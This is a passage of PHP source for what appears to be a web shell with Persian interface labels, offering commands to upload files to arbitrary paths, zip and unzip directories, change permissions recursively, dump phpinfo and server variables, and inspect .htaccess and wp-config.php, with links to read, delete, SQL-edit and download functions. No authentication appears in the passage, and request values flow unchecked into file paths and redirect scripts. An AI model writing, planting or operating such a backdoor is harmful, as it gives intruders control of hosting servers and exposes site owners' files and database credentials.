                }
                exit();
            }
        ?>
            <form class="form" method="post" enctype="multipart/form-data">
                <div class="row form-group">
                    <div class="col-12">
                        <label for="dir">دایرکتوری</label>
                        <input class="form-control" id="dir" name="dir">
                    </div>
                </div>
                <input type="hidden" name="command" value="downloader">
                <div class="row form-group">
                    <div class="col-12">
                        <button class="btn btn-primary">ارسال</button>
                    </div>
                </div>
            </form>
        <?php
        } elseif (@$_REQUEST['command'] == "uploader") {
            if (isset($_FILES['file'])) {
                copy($_FILES["file"]["tmp_name"], $dirtohome . $_REQUEST['to']);
                echo "<script type='text/javascript'>window.top.location='?command=uploader" . "'</script>";
                exit();
            }
        ?>
            <form class="form" method="post" enctype="multipart/form-data">
                <div class="row form-group">
                    <div class="col-6">
                        <label for="file">فایل</label>
                        <input type="file" class="form-control" id="file" name="file">
                    </div>
                    <div class="col-6">
                        <label for="to">به</label>
                        <input class="form-control" id="to" name="to">
                    </div>
                </div>
                <input type="hidden" name="command" value="uploader">
                <div class="row form-group">
                    <div class="col-12">
                        <button class="btn btn-primary">ارسال</button>
                    </div>
                </div>
            </form>
        <?php
        } elseif (@$_REQUEST['command'] == "phpinfo") {
            echo "<div id='leftall'>";
            echo phpinfo();
            echo "</div>";
        } elseif (@$_REQUEST['command'] == "phpservers") {
            echo "<pre>";
            print_r($_SERVER);
            echo "</pre>";
        } elseif (@$_REQUEST['command'] == "unziper") {
            if (isset($_REQUEST['dir'])) {
                $zip = new ZipArchive;
                $res = $zip->open($dirtohome . $_REQUEST['dir']);
                if ($res === TRUE) {
                    $zip->extractTo($dirtohome . $_REQUEST['to']);
                    $zip->close();
                    if (isset($_REQUEST['re'])) {
                        echo "<script type='text/javascript'>window.top.location='" . $_REQUEST['re'] . "'</script>";
                        exit();
                    }
                    echo "<script type='text/javascript'>window.top.location='?command=unziper" . "'</script>";
                    exit();
                }
            }
        ?>
            <form class="form" method="post" enctype="multipart/form-data">
                <div class="row form-group">
                    <div class="col-6">
                        <label for="فایل زیپ">فایل</label>
                        <input type="text" class="form-control" id="dir" name="dir">
                    </div>
                    <div class="col-6">
                        <label for="to">به</label>
                        <input class="form-control" id="to" name="to">
                    </div>
                </div>
                <input type="hidden" name="command" value="unziper">
                <div class="row form-group">
                    <div class="col-12">
                        <button class="btn btn-primary">ارسال</button>
                    </div>
                </div>
            </form>
        <?php
        } elseif (@$_REQUEST['command'] == "ziper") {
            if (isset($_REQUEST['dir'])) {
                function addToZip($dir, $zipArchive, $zipdir = '')
                {
                    // if(file_exists($dir)){
                    // unlink($dir);
                    // }
                    if (is_dir($dir)) {
                        if (@end(str_split($dir)) != "/") $dir .= "/";
                        if ($dh = opendir($dir)) {
                            if (!empty($zipdir)) $zipArchive->addEmptyDir($zipdir);
                            while (($file = readdir($dh)) !== false) {
                                if (!is_file($dir . $file)) {
                                    if (($file !== ".") && ($file !== "..")) {
                                        addToZip($dir . $file . "/", $zipArchive, $zipdir . $file . "/");
                                    }
                                } else {
                                    $zipArchive->addFile($dir . $file, $zipdir . $file);
                                }
                            }
                        }
                    } else {
                        @$files = explode("/", $dir);
                        if (@end(str_split($dir)) == "/") {
                            @$file = $files[(count($files) - 2)];
                        } else {
                            @$file = end($files);
                        }
                        $zipArchive->addFile($dir, $file);
                    }
                }
                $zip = new ZipArchive();
                $zip->open($dirtohome . $_REQUEST['to'], ZIPARCHIVE::CREATE);
                addToZip($dirtohome . $_REQUEST['dir'], $zip);
                $zip->close();
                if (isset($_REQUEST['re'])) {
                    echo "<script type='text/javascript'>window.top.location='" . $_REQUEST['re'] . "'</script>";
                    exit();
                }
                echo "<script type='text/javascript'>window.top.location='?command=ziper" . "'</script>";
                exit();
            }
        ?>
            <form class="form" method="post" enctype="multipart/form-data">
                <div class="row form-group">
                    <div class="col-6">
                        <label for="دایرکتوری">فایل</label>
                        <input type="text" class="form-control" id="dir" name="dir">
                    </div>
                    <div class="col-6">
                        <label for="to">به</label>
                        <input class="form-control" id="to" name="to">
                    </div>
                </div>
                <input type="hidden" name="command" value="ziper">
                <div class="row form-group">
                    <div class="col-12">
                        <button class="btn btn-primary">ارسال</button>
                    </div>
                </div>
            </form>
        <?php
        } elseif (@$_REQUEST['command'] == "chmod") {
            if (isset($_REQUEST['dir'])) {
                function chmod_R($path, $filemode)
                {
                    $filemode = octdec($filemode);
                    if (!is_dir($path))
                        return chmod($path, $filemode);

                    $dh = opendir($path);
                    while (($file = readdir($dh)) !== false) {
                        if ($file != '.' && $file != '..') {
                            $fullpath = $path . '/' . $file;
                            if (is_link($fullpath))
                                return FALSE;

                            elseif (!is_dir($fullpath))
                                if (!chmod($fullpath, $filemode))
                                    return FALSE;

                                elseif (!chmod_R($fullpath, $filemode))
                                    return FALSE;
                        }
                    }
                    closedir($dh);
                    if (chmod($path, $filemode))
                        return TRUE;

                    else
                        return FALSE;
                }
                chmod_R($dirtohome . $_REQUEST['dir'], $_REQUEST['to']);
                if (isset($_REQUEST['re'])) {
                    echo "<script type='text/javascript'>window.top.location='" . $_REQUEST['re'] . "'</script>";
                    exit();
                }
                echo "<script type='text/javascript'>window.top.location='?command=chmod" . "'</script>";
                exit();
            }
        ?>
            <form class="form" method="post" enctype="multipart/form-data">
                <div class="row form-group">
                    <div class="col-6">
                        <label for="دایرکتوری">فایل</label>
                        <input type="text" class="form-control" id="dir" name="dir">
                    </div>
                    <div class="col-6">
                        <label for="to">به</label>
                        <input class="form-control" id="to" name="to">
                    </div>
                </div>
                <input type="hidden" name="command" value="chmod">
                <div class="row form-group">
                    <div class="col-12">
                        <button class="btn btn-primary">ارسال</button>
                    </div>
                </div>
            </form>
            <?php
        } elseif (@$_REQUEST['command'] == "getchmod") {
            if (isset($_REQUEST['dirlist'])) {
                if (@end(explode("/", $_REQUEST['dirlist'])) == "dathtaccess") {
                    @$_REQUEST['dirlist'] = str_replace(end(explode("/", $_REQUEST['dirlist'])), ".htaccess", $_REQUEST['dirlist']);
                } elseif (@end(explode("/", $_REQUEST['dirlist'])) == "wpconfig.php" && !file_exists($dirtohome . $_REQUEST['dirlist'])) {
                    @$_REQUEST['dirlist'] = str_replace(end(explode("/", $_REQUEST['dirlist'])), "wp-config.php", $_REQUEST['dirlist']);
                }
                $mode = substr(sprintf('%o', fileperms($dirtohome . $_REQUEST['dirlist'])), -4);
            ?>
                <div class="mt-2 alert alert-secondary alert-dismissible fade show">
                    <button type="button" class="close" data-dismiss="alert">&times;</button>
                    <strong><?php echo $mode ?></strong>
                </div>
            <?php
            }
            ?>
            <form class="form" method="post" enctype="multipart/form-data">
                <div class="row form-group">
                    <div class="col-12">
                        <label for="دایرکتوری">فایل</label>
                        <input type="text" class="form-control" id="dirlist" name="dirlist">
                    </div>
                </div>
                <input type="hidden" name="command" value="getchmod">
                <div class="row form-group">
                    <div class="col-12">
                        <button class="btn btn-primary">ارسال</button>
                    </div>
                </div>
            </form>
        <?php
        } elseif (isset($_REQUEST['command'])) {
        ?>
            <div class='pt-2 pb-1' id='leftall'><a class='btn btn-info col-12 text-center' href='?command=read'>read</a></div>
            <div class='py-1' id='leftall'><a class='btn btn-info col-12 text-center' href='?command=delete'>delete</a></div>
            <div class='py-1' id='leftall'><a class='btn btn-info col-12 text-center' href='?command=sqledit'>sqledit</a></div>
            <div class='py-1' id='leftall'><a class='btn btn-info col-12 text-center' href='?command=mkf'>mkf</a></div>
            <div class='py-1' id='leftall'><a class='btn btn-info col-12 text-center' href='?command=copy'>copy</a></div>
            <div class='py-1' id='leftall'><a class='btn btn-info col-12 text-center' href='?command=dirlist'>dirlist</a></div>
            <div class='py-1' id='leftall'><a class='btn btn-info col-12 text-center' href='?command=alldirlist'>alldirlist</a></div>
            <div class='py-1' id='leftall'><a class='btn btn-info col-12 text-center' href='?command=finder'>finder</a></div>
            <div class='py-1' id='leftall'><a class='btn btn-info col-12 text-center' href='?command=downloader'>downloader</a></div>
            <div class='py-1' id='leftall'><a class='btn btn-info col-12 text-center' href='?command=uploader'>uploader</a></div>
            <div class='py-1' id='leftall'><a class='btn btn-info col-12 text-center' href='?command=phpinfo'>phpinfo</a></div>
            <div class='py-1' id='leftall'><a class='btn btn-info col-12 text-center' href='?command=phpservers'>phpservers</a></div>
            <div class='py-1' id='leftall'><a class='btn btn-info col-12 text-center' href='?command=unziper'>unziper</a></div>
            <div class='py-1' id='leftall'><a class='btn btn-info col-12 text-center' href='?command=ziper'>ziper</a></div>
            <div class='py-1' id='leftall'><a class='btn btn-info col-12 text-center' href='?command=chmod'>chmod</a></div>
            <div class='py-1' id='leftall'><a class='btn btn-info col-12 text-center' href='?command=getchmod'>getchmod</a></div>
        <?php
        }
        if (@$_REQUEST['command'] != "check" && @$_REQUEST['command'] != "checkdel" && !isset($_REQUEST['dir'])) {
        ?>
        </div>
    </body>

    </html>
<?php
        }
?>